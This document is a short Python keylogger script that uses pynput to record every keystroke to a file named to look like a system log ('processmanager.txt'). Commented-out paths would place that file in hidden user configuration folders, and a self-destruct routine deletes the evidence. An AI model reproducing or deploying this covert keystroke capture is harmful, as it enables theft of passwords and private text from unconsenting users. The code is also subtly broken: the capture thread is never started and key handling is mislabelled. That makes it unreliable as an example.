import os
from pynput.keyboard import Listener
import time
import threading
import sys


class Keylogger():
    keys = []
    count = 0
    flag = 0

    # if sys.platform == "win32":
    #     path = os.environ['appdata'] + '\\processmanager.txt'
    # elif sys.platform == "linux" or sys.platform == "linux2" or sys.platform == "darwin":
    #     path = os.environ['HOME'] + "/.config/processmanager.txt"
    path = "processmanager.txt"

    def on_press(self, key):
        self.keys.append(key)
        self.count += 1

        if self.count >= 1:
            self.count = 0
            self.write_file(self.keys)
            self.keys = []

    def read_logs(self):
        with open(self.path, 'rt') as f:
            return f.read()
    def write_file(self, keys):
        with open(self.path, 'a') as f:
            for key in keys:
                k = str(key).replace("'", "")
                if k.find('backspace') > 0:
                    f.write(' Backspace ')
                elif k.find('enter') > 0:
                    f.write('\n')
                elif k.find('shift') > 0:
                    f.write(' Shit ')
                elif k.find('space') > 0:
                    f.write(' ')
                elif k.find('caps_lock') > 0:
                    f.write(' Caps_lock ')
                elif k.find('Key'):
                    f.write(k)

    def self_destruction(self):
        self.flag = 1
        listener.stop()
        os.remove(self.path)

    def start(self):
        global listener
        with Listener(on_press=self.on_press) as listener:
            listener.join()


if __name__ == '__main__':
    keylog = Keylogger()
    t = threading.Thread(target=keylog.start)
    while keylog.flag != 1:
        time.sleep(10)
        logs = keylog.read_logs()
        print(logs)
        # keylog.self_destruction()
    t.join()
